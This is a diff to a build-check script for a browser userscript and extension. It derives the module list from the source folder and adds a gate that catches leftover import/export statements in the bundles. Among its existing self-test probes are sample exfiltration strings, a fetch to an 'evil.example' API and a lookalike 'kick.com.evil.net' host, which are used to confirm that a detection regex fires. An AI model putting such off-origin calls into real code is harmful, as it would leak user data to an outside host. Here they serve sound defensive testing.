@@ -1,4 +1,4 @@
-import { readFile } from 'node:fs/promises';
+import { readFile, readdir } from 'node:fs/promises';
 import { resolve } from 'node:path';
 import { AD_HOSTS, TELEMETRY_HOSTS, TELEMETRY_NO_CANCEL_HOSTS, cancellableTelemetryHosts, STORAGE_STORES, buildSettingsExport, VERSION } from '../src/core.mjs';
 
@@ -67,7 +67,13 @@ async function missingExports(moduleFile, bundle) {
 }
 
 const bundleTargets = [['dist/kick-focus.user.js', source], ['dist/extension/content/kick-focus.js', content], ['dist/extension-firefox/content/kick-focus.js', firefoxContent]];
-const moduleFiles = ['src/core.mjs', 'src/api.mjs', 'src/compatibility.mjs'];
+// Read from the tree, not hand-listed: the promise above — that a module added
+// later is covered without anyone remembering this file — is only true if the
+// list is derived. It was hand-written, so src/multistream.mjs would have been
+// bundled and checked by nothing.
+const moduleFiles = (await readdir(resolve('src')))
+  .filter((name) => name.endsWith('.mjs'))
+  .map((name) => `src/${name}`);
 const bundleGaps = [];
 for (const [bundleName, bundleSource] of bundleTargets) {
   for (const moduleFile of moduleFiles) {
@@ -111,6 +117,21 @@ const importGapsIn = (body) => STORAGE_STORES
   .filter((reference) => !String(body).includes(reference));
 const importGaps = importGapsIn(importBody);
 
+/**
+ * No module syntax may survive into a bundle.
+ *
+ * The build strips `import`/`export` and leans on concat order to supply the
+ * names instead, which is what lets a bundled module declare real imports and
+ * still load standalone under node:test. If a strip ever misses — a multi-line
+ * import, a double-quoted specifier, a new `export {}` form — the artifact gets
+ * an `import` statement inside a function body, which is a SyntaxError the
+ * moment a browser parses it. `node --check` catches it for the userscript; this
+ * catches it for all three artifacts and names which one.
+ */
+const MODULE_SYNTAX = /^(?:import|export)\s/m;
+const withModuleSyntax = (bundle) => MODULE_SYNTAX.test(bundle);
+const leakedModuleSyntax = bundleTargets.filter(([, bundleSource]) => withModuleSyntax(bundleSource)).map(([name]) => name);
+
 /** Any `innerHTML =` in a shipped bundle that is not handed to the policy. */
 const bareHTMLWrite = /\.innerHTML\s*=(?!\s*trustedHTML\()/g;
 const unroutedHTML = bundleTargets
@@ -122,6 +143,8 @@ const checks = [
   // value as a pass, so `gaps.length === 0 || gaps.join()` would report success
   // precisely when there were gaps.
   [`every module export is defined in every bundle${bundleGaps.length ? ` — ${bundleGaps.join(' | ')}` : ''}`, bundleGaps.length === 0],
+  [`every src/*.mjs module is checked against the bundles (${moduleFiles.length})`, moduleFiles.length >= 4],
+  [`no import/export statement survives into a bundle${leakedModuleSyntax.length ? ` — ${leakedModuleSyntax.join(', ')}` : ''}`, leakedModuleSyntax.length === 0],
   // Userscript artifact
   ['metadata starts at byte zero', source.startsWith('// ==UserScript==')],
   ['version is synchronized', source.includes(`// @version      ${VERSION}`)],
@@ -605,6 +628,12 @@ const redProbes = [
   ['exfil gate would catch an off-origin api call', EXFIL_REGEX.test('fetch(`https://evil.example/api/v1/log`)')],
   ['exfil gate would catch a lookalike host', EXFIL_REGEX.test('https://kick.com.evil.net/api/v1/log')],
   ['shadow-a11y gate would reject a bundle with no host-keyed rules', !shadowAccessibilityWired('')],
+  ['module-syntax gate would catch a surviving import',
+    withModuleSyntax("'use strict';\nimport { x } from './core.mjs';\nconst y = 1;\n")],
+  ['module-syntax gate would catch a surviving export',
+    withModuleSyntax("'use strict';\nexport function x() {}\n")],
+  ['module-syntax gate accepts a stripped bundle',
+    !withModuleSyntax("'use strict';\nfunction x() {}\nconst y = 'import { a } from b';\n")],
   ['trusted-types gate would catch a bare innerHTML write',
     /\.innerHTML\s*=(?!\s*trustedHTML\()/.test('node.innerHTML = `<b>x</b>`;')],
   ['trusted-types gate accepts a policy-routed write',
